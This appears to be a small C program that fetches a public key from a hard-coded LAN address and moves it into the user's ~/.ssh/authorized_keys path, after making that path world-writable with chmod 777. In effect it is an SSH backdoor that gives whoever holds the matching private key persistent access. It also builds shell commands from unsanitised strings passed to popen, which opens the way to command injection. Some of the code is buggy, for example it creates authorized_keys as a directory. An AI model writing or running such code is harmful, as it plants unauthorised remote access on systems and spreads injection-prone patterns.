#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <dirent.h>
#include "net_functions.h"

struct config {
	char * destination;
	char * source_and_outfile;
	char * url;
};

void MoveFile(const char * file, const char * dest) {
	FILE * proc;

	char command[70];
	int len;

	len = snprintf(command, sizeof(command), "mv %s %s", file, dest);

	if (len <= sizeof(command)) {
		proc = popen(command, "r");
	}

	else {
		printf("command buffer too short");
	}
}

void CreateDirectory(const char * dir) {
	FILE * proc;

	char command[70];
	int len;

	len = snprintf(command, sizeof(command), "mkdir %s", dir);

	if (len <= sizeof(command)) {
		proc = popen(command, "r");
	}

	else {
		printf("command buffer too short");
	}
}

void my_chmod(int mode, const char * file_or_dir) {
	FILE * proc;

	char command[70];
	int len;

	len = snprintf(command, sizeof(command), "chmod %d %s", mode, file_or_dir);

	if (len <= sizeof(command)) {
		proc = popen(command, "r");
	}

	else {
		printf("command buffer too short");
	}
}

int main(void) {
	struct stat st = { 0 };
	struct config config_1;

	// CONFIG

	config_1.url = "http://192.168.1.238/key.pub";
	config_1.source_and_outfile = "/tmp/key.pub";
	config_1.destination = "~/.ssh/authorized_keys/";

	// END CONFIG 


	printf("creating directory %s\n", config_1.destination);
	CreateDirectory(config_1.destination);
	my_chmod(777, config_1.destination);
	
	printf("downlading %s from %s\n\n", config_1.source_and_outfile, config_1.url);
	DownloadFiles(config_1.url, config_1.source_and_outfile);

	printf("moving %s to %s\n", config_1.source_and_outfile, config_1.destination);
	MoveFile(config_1.source_and_outfile, config_1.destination);

	return 0;
}
